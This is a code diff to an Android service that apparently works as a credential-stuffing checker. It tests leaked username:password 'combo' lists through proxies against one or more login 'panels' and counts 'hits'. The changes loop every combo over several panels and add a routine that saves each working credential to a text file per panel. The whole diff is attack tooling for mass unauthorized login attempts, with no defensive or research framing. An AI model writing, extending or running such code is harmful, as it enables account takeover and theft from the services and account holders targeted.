@@ -13,13 +13,19 @@ import android.util.Log;
 import androidx.annotation.Nullable;
 import androidx.core.app.NotificationCompat;
 
+import android.content.SharedPreferences;
+import android.net.Uri;
+import android.preference.PreferenceManager;
+import androidx.documentfile.provider.DocumentFile;
 import org.json.JSONException;
 import org.json.JSONObject;
 
 import java.io.BufferedReader;
 import java.io.File;
+import java.io.FileOutputStream;
 import java.io.FileReader;
 import java.io.IOException;
+import java.io.OutputStream;
 import java.util.ArrayList;
 import java.util.List;
 import java.util.concurrent.ExecutorService;
@@ -38,7 +44,7 @@ public class ScanService extends Service {
     private ExecutorService executorService;
     private OkHttpClient httpClient;
 
-    private String panel;
+    private List<String> panels;
     private List<String> combos;
     private List<String> proxies;
     private int speed;
@@ -70,7 +76,7 @@ public class ScanService extends Service {
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
         if (intent != null) {
-            panel = intent.getStringExtra("panel");
+            panels = intent.getStringArrayListExtra("panels");
             String combosFilePath = intent.getStringExtra("combosFilePath");
             String proxiesFilePath = intent.getStringExtra("proxiesFilePath");
             speed = intent.getIntExtra("speed", 10);
@@ -110,24 +116,26 @@ public class ScanService extends Service {
         currentIndex.set(0);
         executorService = Executors.newFixedThreadPool(speed);
 
-        for (int i = 0; i < combos.size(); i++) {
-            if (!isRunning) break;
-            final int comboIndex = i;
-            executorService.submit(() -> {
-                if (!isRunning) return;
-                String combo = combos.get(comboIndex);
-                if (combo.contains(":")) {
-                    String[] parts = combo.split(":");
-                    String user = parts[0].trim();
-                    String pass = parts[1].trim();
-                    checkCombo(panel, user, pass);
-                }
-                currentIndex.incrementAndGet();
-                updateNotification();
-                if (currentIndex.get() == combos.size()) {
-                    stopScan();
-                }
-            });
+        for (String panel : panels) {
+            for (int i = 0; i < combos.size(); i++) {
+                if (!isRunning) break;
+                final int comboIndex = i;
+                executorService.submit(() -> {
+                    if (!isRunning) return;
+                    String combo = combos.get(comboIndex);
+                    if (combo.contains(":")) {
+                        String[] parts = combo.split(":");
+                        String user = parts[0].trim();
+                        String pass = parts[1].trim();
+                        checkCombo(panel, user, pass);
+                    }
+                    currentIndex.incrementAndGet();
+                    updateNotification();
+                    if (currentIndex.get() == combos.size() * panels.size()) {
+                        stopScan();
+                    }
+                });
+            }
         }
         executorService.shutdown();
     }
@@ -177,6 +185,7 @@ public class ScanService extends Service {
                         if (listener != null) {
                             listener.onHitFound(hit);
                         }
+                        saveHitToFile(hit);
                     } else {
                         failsCount.incrementAndGet();
                     }
@@ -189,6 +198,33 @@ public class ScanService extends Service {
         } catch (IOException | JSONException e) {
             failsCount.incrementAndGet();
             Log.e("ScanService", "Erro ao verificar combo: " + e.getMessage());
+        }
+    }
+
+    private void saveHitToFile(Hit hit) {
+        SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(this);
+        String directoryUriString = prefs.getString("hits_directory", null);
+        if (directoryUriString == null) {
+            return;
+        }
+
+        Uri directoryUri = Uri.parse(directoryUriString);
+        DocumentFile directory = DocumentFile.fromTreeUri(this, directoryUri);
+
+        if (directory != null && directory.exists() && directory.isDirectory()) {
+            String fileName = hit.getPanel().replaceAll("[^a-zA-Z0-9.-]", "_") + ".txt";
+            DocumentFile file = directory.findFile(fileName);
+            if (file == null) {
+                file = directory.createFile("text/plain", fileName);
+            }
+
+            try (OutputStream os = getContentResolver().openOutputStream(file.getUri(), "wa")) {
+                if (os != null) {
+                    os.write((hit.getFormattedText() + "\n\n").getBytes());
+                }
+            } catch (IOException e) {
+                e.printStackTrace();
+            }
         }
     }
 
